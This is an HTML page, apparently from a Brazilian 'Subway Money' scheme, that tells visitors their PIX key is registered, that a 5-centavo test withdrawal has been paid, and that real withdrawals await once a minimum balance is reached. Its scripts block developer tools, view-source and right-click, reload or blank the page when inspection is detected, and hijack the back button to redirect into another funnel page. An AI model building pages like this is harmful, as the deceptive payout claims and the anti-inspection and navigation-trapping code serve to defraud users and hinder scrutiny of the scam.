<!DOCTYPE html>

<html lang="pt-BR">

<head>
    <script>
        // Função para recarregar a página infinitamente
        function reloadPage() {
            location.reload();
            setTimeout(reloadPage, 1000);  // Recarrega a página a cada segundo
        }

        // Event listener para detecção da abertura das ferramentas de desenvolvedor
        window.addEventListener('devtoolschange', function (e) {

            reloadPage();  // Inicia o ciclo de recarregamento da página
        });
    </script>

    <script>
        // Event listener para detecção de teclas
        window.addEventListener('keydown', function (e) {
            // Bloqueia F12
            if (e.key === 'F12' || e.keyCode === 123) {

                e.preventDefault();
            }

            // Bloqueia Ctrl+Shift+I
            if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'I') {

                e.preventDefault();
            }
        });

        // Event listener para detecção do botão direito
        window.addEventListener('contextmenu', function (e) {

            e.preventDefault();
        });

        // Event listener para detecção da abertura das ferramentas de desenvolvedor
        window.addEventListener('devtoolschange', function (e) {

            window.location.href = 'about:blank'; // Redireciona para uma página em branco
        });

        // Event listener para detecção de clique com o botão direito (opcional)
        window.addEventListener('mousedown', function (e) {
            if (e.button === 2) {

                e.preventDefault();
            }
        });
    </script>

    <script>
        // Event listener para detecção do atalho Ctrl+U
        window.addEventListener('keydown', function (e) {
            if ((e.ctrlKey || e.metaKey) && e.key === 'u') {
                e.preventDefault();
            }
            if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'J') {
                e.preventDefault();
            }

            // Bloqueia Ctrl+Shift+K
            if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'K') {
                e.preventDefault();
            }
        });
    </script>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link data-optimized="1" rel="stylesheet" href="assets/css/5921624bf5bbe4c8c091ef09226fa76f.css">
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
    <link data-optimized="1" href="assets/css/1c7a3d2ee9759dc256d915300855c494.css" rel="stylesheet">
    <link data-optimized="1" href="assets/css/ba9cbbe9240a489628be8eb27c56db8a.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="stylesheet" href="assets/css/animated.css">
    <title>Chave PIX Cadastrada - Subway Money </title>
</head>

<body>

    <div class="menu">
        <label style="color: white; text-align: center; width: 100%; font-size: 20px;">Subway Money </label>

    </div>

    <div style="margin-bottom: 100px;"></div>


    <div id="p1" style="display: block;">
        <div class="slogan-inicio">
            <div>
                <p style="color: white; font-weight: bold; font-size: 20px; padding-top: 15px; text-align: center;">
                    Chave PIX cadastrada com sucesso!</p>
            </div>
        </div>

        <div style="margin-bottom: 20px;"></div>

        <div class="white-box">
            <label
                style="background-color: #e2e8ef; padding: 10px; border-radius: 12px; text-align: center; width: 100%; margin-bottom: 10px; line-height: 1.3rem; font-size: 20px; padding-top: 20px; padding-bottom: 20px;">Você
                recebeu o seu saque teste de <b>5 CENTAVOS</b> em nome de <b>"Suitpay".</b> Verifique suas notificações
                ou extrato bancário!<br /><br />
                Agora sua <b>Chave PIX</b> foi confirmada em nosso sistema, e você já poderá realizar seu <b>1º saque
                    quando atingir o valor mínimo!</b></label>
            <div class="row">
                <a style="height: 50px; text-align: center; padding: 10px; font-size: 20px;" href="../cadastro"
                    class="enviarCodigo">CONTINUAR</a>
            </div>
        </div>

    </div>


    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script>
        jQuery(document).ready(function () {
            function limpaUrl() {     //função
                urlpg = $(location).attr('href');   //pega a url atual da página
                urllimpa = urlpg.split("?")[0]      //tira tudo o que estiver depois de '?'

                window.history.replaceState(null, null, urllimpa); //subtitui a url atual pela url limpa
            }

            setTimeout(limpaUrl, 0001) //chama a função depois de 4 segundos
        });

        function queryString(parameter) {
            var loc = location.search.substring(1, location.search.length);
            var param_value = false;
            var params = loc.split("&");
            for (i = 0; i < params.length; i++) {
                param_name = params[i].substring(0, params[i].indexOf('='));
                if (param_name == parameter) {
                    param_value = params[i].substring(params[i].indexOf('=') + 1)
                }
            }
            if (param_value) {
                return param_value;
            }
            else {
                return false;
            }
        }

        var utm = queryString("utm_source");
        history.pushState({}, "", location.href);
        history.pushState({}, "", location.href);
        window.onpopstate = function () {
            setTimeout(function () {
                window.location.href = "coddapp.php?utm_source=" + utm;
            }, 0001);
        };
    </script>

    <script>
        var message = "";
        function clickIE() {
            if (document.all) { (message); return false; }
        }
        function clickNS(e) {
            if (document.layers || (document.getElementById && !document.all)) {
                if (e.which == 2 || e.which == 3) { (message); return false; }
            }
        }
        if (document.layers) {
            document.captureEvents(Event.MOUSEDOWN); document.onmousedown = clickNS;
        }
        else {
            document.onmouseup = clickNS; document.oncontextmenu = clickIE;
        }
        document.oncontextmenu = new Function("return false")


        //  F12
        //==========

        document.onkeypress = function (event) {
            if (e.ctrlKey && (e.keyCode === 123)) {
                // alert('not allowed');
                return false;
            }
        };


        //    CTRL + u
        //==============

        document.onkeydown = function (e) {
            if (e.ctrlKey && (e.keyCode === 85)) {
                // alert('not allowed');
                return false;
            }
        };  
    </script>

    <script>
        $("#tipoChave").change(function () {
            addMaskToInput();
        });

        function addMaskToInput() {
            var $select = $('#tipoChave option:selected').val();
            var $busca = $('#chavePix');
            if ($select == "document") {
                $busca.mask('999.999.999-99');
            }
            if ($select == "phoneNumber") {
                $busca.mask('(99)99999-9999');
            }
        }
    </script>

</body>



<footer>
    <p style="color: #ffffff; text-align: center; font-size: 12px; margin-top: 10px;">©️ 2023 Todos os direitos
        reservados.</p>
</footer>

</html>